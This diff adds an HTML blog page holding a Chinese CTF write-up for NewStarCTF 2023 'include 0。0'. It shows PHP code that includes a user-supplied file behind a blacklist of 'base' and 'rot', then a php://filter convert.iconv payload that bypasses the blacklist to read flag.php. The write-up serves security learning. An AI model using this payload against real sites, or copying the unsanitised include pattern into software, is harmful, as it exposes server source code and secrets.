@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>include 0。0 · Maple/G7</title>
+<meta name="description" content="NewStarCTF 2023 公开赛道。黑名单挡掉了 base64 和 rot13，只能换个过滤器：用 php://filter 的 convert.iconv 把 flag.php 的源码读出来。">
+<script>document.documentElement.classList.add('js');</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500&family=Noto+Serif+SC:wght@400;600;900&family=Noto+Sans+SC:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css?v=v14">
+</head>
+<body class="page-post">
+
+<div class="grain" aria-hidden="true"></div>
+<div class="rule-rail" aria-hidden="true"></div>
+<div class="progress" id="progress" aria-hidden="true"></div>
+<div class="cursor" id="cursor" aria-hidden="true"><span class="cursor-ring"></span><span class="cursor-dot"></span></div>
+
+<header class="topbar">
+  <a class="brand" href="index.html">
+    <span class="brand-mark">Maple<span class="t-slash">/</span>G7</span>
+  </a>
+  <nav class="nav">
+    <a href="index.html">首页</a>
+    <a href="notes.html" class="is-on">文章</a>
+    <a href="projects.html">项目</a>
+    <a href="links.html">友链</a>
+    <a href="about.html">关于</a>
+  </nav>
+  <p class="topbar-meta mono">VOL.01 / 2026</p>
+</header>
+
+<article class="post">
+
+  <header class="cover">
+    <div class="cover-art" aria-hidden="true">
+      <img src="img/cover-wp1.webp" alt="" style="object-position: 50% 40%" fetchpriority="high" decoding="async">
+    </div>
+    <div class="cover-ticks" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
+
+    <div class="cover-inner">
+      <p class="kicker mono"><span class="k-no">01</span>NOTES <em>·</em> WP <em>·</em> 2026.11.11</p>
+      <h1 class="post-title">include 0。0</h1>
+      <p class="post-desc">NewStarCTF 2023 公开赛道。黑名单挡掉了 base64 和 rot13，只能换个过滤器：用 php://filter 的 convert.iconv 把 flag.php 的源码读出来。</p>
+
+      <ul class="post-meta mono">
+        <li><b>79</b>字</li>
+        <li class="meta-tags"><b>TAGS</b><ul class="tag-list"><li>文件包含</li><li>php://filter</li><li>convert.iconv</li><li>黑名单绕过</li></ul></li>
+      </ul>
+
+      <div class="cover-seal" aria-hidden="true"><span>墨</span></div>
+    </div>
+  </header>
+
+  <nav class="post-bar">
+    <a class="post-back" href="notes.html" data-hover><span>←</span>全部文章</a>
+    <span class="post-bar-mid mono">WP · 79 字</span>
+  </nav>
+
+  <div class="layout">
+
+    <aside class="toc">
+      <div class="toc-sticky">
+        <p class="rail-h mono">INDEX</p>
+        <ol class="toc-list"><li class="toc-item toc-l2"><a href="#s1" data-toc="s1"><span class="toc-no">01</span><span class="toc-tx">题目源码</span></a></li><li class="toc-item toc-l2"><a href="#s2" data-toc="s2"><span class="toc-no">02</span><span class="toc-tx">代码审计</span></a></li><li class="toc-item toc-l2"><a href="#s3" data-toc="s3"><span class="toc-no">03</span><span class="toc-tx">读取 flag</span></a></li></ol>
+        <img class="toc-mo" src="img/mo-01.webp" alt="" aria-hidden="true">
+      </div>
+    </aside>
+
+    <div class="prose"><h2 id="s1">题目源码<a class="h-link" href="#s1" aria-hidden="true">§</a></h2>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"> &lt;?php
+<span class="hljs-keyword">highlight_file</span>(__FILE__);
+<span class="hljs-comment">// FLAG in the flag.php</span>
+<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-keyword">preg_match</span>(<span class="hljs-string">'/base|rot/i'</span>,<span class="hljs-variable">$file</span>)){
+    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);
+}<span class="hljs-keyword">else</span>{
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope"</span>);
+}
+?&gt; nope</code></pre></div>
+<h2 id="s2">代码审计<a class="h-link" href="#s2" aria-hidden="true">§</a></h2>
+<p>代码审计：</p>
+<p>我们要找的flag在flag.php，这是一道文件包含。</p>
+<p>参数file完全由用户输入决定，存在黑名单禁止了<code>base64</code>、<code>rot13</code>这类常见 <code>php://filter</code> 过滤器。</p>
+<h2 id="s3">读取 flag<a class="h-link" href="#s3" aria-hidden="true">§</a></h2>
+<p>直接访问<code>?file=flag.php</code>没有回显，我们需要读取<code>flag.php</code> 源码，使用<code>php://filter</code> + <code>convert.iconv</code>：</p>
+<div class="code" data-lang="text"><div class="code-head"><span class="code-lang">text</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">?file=php://filter/convert.iconv.SJIS*.UCS-4*/resource=flag.php</code></pre></div>
+<figure class="fig"><img src="img/wp1-1.webp" alt="php://filter convert.iconv 回显" loading="lazy" decoding="async"></figure>
+<hr></div>
+
+    <aside class="margin">
+      <div class="margin-sticky">
+        <p class="rail-h mono">READ</p>
+        <p class="margin-pct mono" id="readPct">000<span>%</span></p>
+        <img class="margin-mo" src="img/mo-02.webp" alt="" aria-hidden="true">
+        <div class="rail-more rail-more--right">
+          <p class="rail-h mono">ALL ARTICLES</p>
+          <ul class="rail-list"><li class="is-now"><a href="post-include-0.html"><i>▸</i>include 0。0</a></li><li><a href="post-include-pear.html" data-hover><i>·</i>Include 🍐</a></li><li><a href="post.html" data-hover><i>·</i>SSRF从0到1</a></li><li><a href="post-http.html" data-hover><i>·</i>HTTP 基础</a></li><li><a href="post-php.html" data-hover><i>·</i>PHP语言基础</a></li></ul>
+        </div>
+      </div>
+    </aside>
+
+  </div>
+</article>
+
+<footer class="foot">
+  <div class="foot-inner">
+    <a class="foot-back" href="notes.html" data-hover><span>←</span> 全部文章</a>
+
+    <div class="foot-nav">
+      <a class="foot-link" href="post-php.html" data-hover>
+        <span class="mono">PREV</span>
+        <b>PHP语言基础</b>
+      </a>
+      <a class="foot-link foot-link--next" href="post-include-pear.html" data-hover>
+        <span class="mono">NEXT</span>
+        <b>Include 🍐</b>
+      </a>
+    </div>
+
+    <div class="foot-mo" aria-hidden="true">
+      <img src="img/mo-03.webp" alt="">
+      <img src="img/mo-05.webp" alt="">
+      <img src="img/mo-12.webp" alt="">
+    </div>
+
+    <p class="foot-copy">MAPLE (G7) · WEB SECURITY NOTES</p>
+  </div>
+</footer>
+
+<script src="app.js?v=v14"></script>
+</body>
+</html>
